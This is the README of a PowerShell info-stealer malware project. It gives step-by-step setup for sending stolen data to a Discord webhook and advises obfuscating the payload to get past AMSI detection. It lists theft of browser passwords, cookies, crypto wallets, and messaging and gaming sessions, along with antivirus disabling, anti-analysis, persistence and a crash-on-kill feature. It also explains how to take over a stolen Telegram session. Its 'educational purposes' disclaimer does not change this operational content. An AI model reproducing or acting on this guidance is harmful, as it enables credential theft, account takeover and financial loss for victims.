<p align="center">
<img src="https://github.com/Chainski/PowerShell-Token-Grabber/assets/96607632/278e69c5-b54c-49a6-989a-e3596eb1ff63", width="300", height="300">
</p>

<h1 align="center">
</h1>
<p align= "center">
  <img src="https://img.shields.io/github/languages/top/ChildrenOfYahweh/Powershell-Token-Grabber?color=blue">
   <img src="https://img.shields.io/github/stars/ChildrenOfYahweh/Powershell-Token-Grabber?style=flat&color=blue">
   <img src="https://img.shields.io/github/forks/ChildrenOfYahweh/Powershell-Token-Grabber?style=flat&color=blue">
   <img src="https://img.shields.io/github/issues/ChildrenOfYahweh/Powershell-Token-Grabber?style=flat&color=blue">
  <img src="https://img.shields.io/github/commit-activity/m/ChildrenOfYahweh/Powershell-Token-Grabber">
  <img src="https://img.shields.io/badge/PowerShell-%E2%89%A5%20v3.0-blue">
  <br>
   <img src="https://img.shields.io/github/last-commit/ChildrenOfYahweh/Powershell-Token-Grabber?color=blue">
   <img src="https://img.shields.io/github/license/ChildrenOfYahweh/Powershell-Token-Grabber?color=blue">
   <img src="https://img.shields.io/github/contributors/ChildrenOfYahweh/Powershell-Token-Grabber?color=blue">
    <img src="https://hits.sh/github.com/ChildrenOfYahweh/Powershell-Token-Grabber.svg?label=views&color=1183c3">
    <img src="https://img.shields.io/github/repo-size/ChildrenOfYahweh/Powershell-Token-Grabber.svg?label=Repo%20size&style=flat-square">
    <img src="https://img.shields.io/github/downloads/ChildrenOfYahweh/PowerShell-Token-Grabber/total?color=blue">
   <br>
</p>

<h1 align="center">PowerShell Token Grabber</h1>
 
Malware targeting Windows systems that utilizes [PowerShell](https://learn.microsoft.com/en-us/powershell/scripting/overview?view=powershell-5.1) for the purpose of data exfiltration. All information collected is sent using [Discord webhooks](https://support.discord.com/hc/en-us/articles/228383668-Intro-to-Webhooks).

<br>

> [!IMPORTANT] 
> As of 2024-02-14, PowerShell-Token-Grabber is detected by AMSI ([malware-encyclopedia](https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?name=Trojan%3APowerShell%2FKDotGrabber.RDA!MTB&threatid=2147900454)). You need to obfuscate the generated payload in order to use it effectively. 


# Usage
- Create a Webhook on your [Discord Server](https://discord.com). I recommend creating a new server.
- After creating a server go to ```Edit channel``` > ```Integrations``` > ```Webhooks``` > ```Create Webhook```
- Copy the ```Webhook URL```
- Download ```main.ps1``` 
- Open ```main.ps1``` and replace ```YOUR_WEBHOOK_HERE``` in line ```30``` with your webhook or use the [builder](https://github.com/ChildrenOfYahweh/Powershell-Token-Grabber/releases/tag/Builder).

# Want to obfuscate the code ?
Use [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation). \
Or use [Somalifuscator](https://github.com/kdot227/somalifuscator) for ```.bat``` files 

# Screenshots
  ## 🔨 Builder
> ![GUI](https://github.com/Chainski/PowerShell-Token-Grabber/assets/96607632/f157716e-5ff9-446c-9e8c-629b163d52a0)


   ### Builder Features
 - [x] 🔸 Obfuscation of ```BAT``` and ```PS1``` files
 - [x] 🔩 Compilation of Exe Files (currently unstable)
 - [x] 💉 Pump/Inject the output exe file with zero-filled bytes 

 ## 🔷 Webhook Data
> ![screenshot](https://github.com/Chainski/PowerShell-Token-Grabber/assets/96607632/7830653b-1fbb-46e6-8c49-26883a3eb34f)

> ![data](https://github.com/Chainski/PowerShell-Token-Grabber/assets/96607632/630ba5ab-09e4-4427-826a-f5461623cd54)

#  Features
- [x] GUI Builder
- [x] Anti-Kill (Terminating the grabber will result in a system crash, indicated by a ```BSoD``` [blue screen of death](https://support.microsoft.com/en-us/windows/resolving-blue-screen-errors-in-windows-60b01860-58f2-be66-7516-5c45a66ae3c6)).
- [x] [Mutex](https://learn.microsoft.com/en-us/dotnet/api/system.threading.mutex?view=net-7.0) (single instance)
- [x] Force [UAC](https://learn.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [x] Antivirus Evasion: Disables [AMSI](https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal) , excluded from ```Windows Defender``` and blocks access to antivirus websites in [hosts file](https://support.microsoft.com/en-us/topic/how-to-reset-the-hosts-file-back-to-the-default-c2a43f9d-e176-c6f3-e4ef-3500277a6dae). 
- [x] Anti-Analysis ```VMWare, VirtualBox, Sandboxes, Emulators, Debuggers, Virustotal, Any.run```
- [x] Persistence via [Task Scheduler](https://learn.microsoft.com/en-us/windows/win32/taskschd/about-the-task-scheduler) 
- [x] Extracts WiFi Passwords
- [x] Files Stealer ```2fa, backupcodes, seedphrases, passwords, privatekeys, etc.``` 
- [x] 📷 Webcam & Desktop Screenshots
- [x] Session Stealers 
  > ### Messaging
    - [Element](https://element.io) 
    - [ICQ](https://icq.com)
    - [Signal](https://signal.org) 
    - [Telegram](https://telegram.org) 
    - [Viber](https://viber.com) 
    - [WhatsApp](https://whatsapp.com)
    - [Skype](https://skype.com/en/get-skype/)
  > ### Gaming 
    - [Electronic Arts](https://ea.com)
    - [Epicgames](https://store.epicgames.com)
    - [Growtopia](https://growtopiagame.com)
    - [Minecraft](https://minecraft.net)
    - [Ubisoft](https://ubisoftconnect.com)
    - [Steam](https://store.steampowered.com)
    - [Battle.net](https://battle.net)
- [x] VPN Clients
    - [Nord](https://nordvpn.com) 
    - [Proton](https://protonvpn.com)
    - [Surfshark](https://surfshark.com)
- [x] Crypto Wallets 
   > Armory | Atomic | Bitcoin | Bytecoin | Coinomi | Dash | Electrum | Ethereum | Exodus | Guarda | Jaxx | Litecoin | Monero | Zcash
- [x] Browsers (Brave, Chrome, Firefox, Microsoft Edge, Thunderbird etc.)
  - 🔑 Passwords
  - 🍪 Cookies
  - 📜 History
- [x] Extracts [Discord](https://discord.com) Token
- [x] Get System Information (Version, CPU, DISK, GPU, RAM, IP, Installed Apps etc.)
- [x] Get System Uptime 
- [X] Get Screen Resolution
- [x] List of Installed Applications
- [x] List of Installed Antiviruses
- [x] List of all Network Adapters
- [x] List of Apps that Run On Startup
- [x] List of Running Services & Applications
- [x] All Network Information
- [x] Extracts Product Key
- [x] Self-Destructs After Execution (optional)

### Telegram Session Stealer Usage :
After the exfiltrated data is uploaded to your discord webhook, download the compressed file ```KDOT.zip```, extract it on your PC, inside that folder there will also be another subfolder ```Messaging Sessions``` , inside this subfolder you will find the ```Telegram``` folder.
Now, copy the tdata folder from ```Telegram``` folder and paste it in the directory below:

```
%userprofile%\AppData\Roaming\Telegram Desktop
```
Before pasting the tdata folder, ensure that you have deleted the existing tdata folder on your PC.
# ![image](https://user-images.githubusercontent.com/96607632/235702107-5800e44e-b4d3-4147-8fb0-b78aece6eae7.png)

 > [!NOTE]   
 > ***The other session stealers can be utilized by applying the technique above***
 
## 🗑 Uninstaller (Removes the Scheduled Task, Script Folder, ExclusionPaths and Resets Hosts File)
- Open a new Elevated Powershell Console then copy & paste the contents below
```ps1
$ErrorActionPreference = "SilentlyContinue"
function Cleanup {
  Unregister-ScheduledTask -TaskName "KDOT" -Confirm:$False
  Remove-Item -Path "$env:appdata\KDOT" -force -recurse
  Remove-MpPreference -ExclusionPath "$env:APPDATA\KDOT"
  Remove-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp"
$resethostsfile = @'
# Copyright (c) 1993-2006 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to host names. Each
# entry should be kept on an individual line. The IP address should
# be placed in the first column followed by the corresponding host name.
# The IP address and the host name should be separated by at least one
# space.
#
# Additionally, comments (such as these) may be inserted on individual
# lines or following the machine name denoted by a '#' symbol.
#
# For example:
#
#      102.54.94.97     rhino.acme.com          # source server
#       38.25.63.10     x.acme.com              # x client host
# localhost name resolution is handle within DNS itself.
#       127.0.0.1       localhost
#       ::1             localhost
'@
  [IO.File]::WriteAllText("$env:windir\System32\Drivers\etc\hosts", $resethostsfile)
  Write-Host "[~] Successfully Uninstalled !" -ForegroundColor Green
}
Cleanup
```

# Need Help?
- [Join our discord server](https://discord.com/invite/WJCNUpxnrE)

# Bug Reports & Suggestions
Found a bug? Have an idea? Let me know [here](https://github.com/KDot227/Powershell-Token-Grabber/issues), Please provide a detailed explanation of the expected behavior, actual behavior, and steps to reproduce, or what you want to see and how it could be done. You can be a small part of this project!

# License
This project is licensed under the MIT License - see the [LICENSE](https://github.com/kdot227/Powershell-Token-Grabber/blob/main/LICENSE) file for details

# Disclaimer
I, the creator, am not responsible for any actions, and or damages, caused by this software.
You bear the full responsibility of your actions and acknowledge that this tool was created for educational purposes only.
This tool's main purpose is NOT to be used maliciously, or on any system that you do not own, or have the right to use.
By using this software, you automatically agree to the above.

# References 

```Yaml
YARA Rule Info
Name : SUSP_PS1_PowerShell_Recon_Mar23_1
RULE Hash : eda1df8e3375891644fe9cac90852b0d
Description : Detects suspicious PowerShell code that performs reconnaissance tasks
Rule Link : https://valhalla.nextron-systems.com/info/rule/SUSP_PS1_PowerShell_Recon_Mar23_1
Rule Author : Florian Roth
```

# Credits
- https://github.com/KDot227
- https://github.com/Chainski
- https://github.com/EvilBytecode

<p align="center"><a href=#top>Back to Top</a></p>
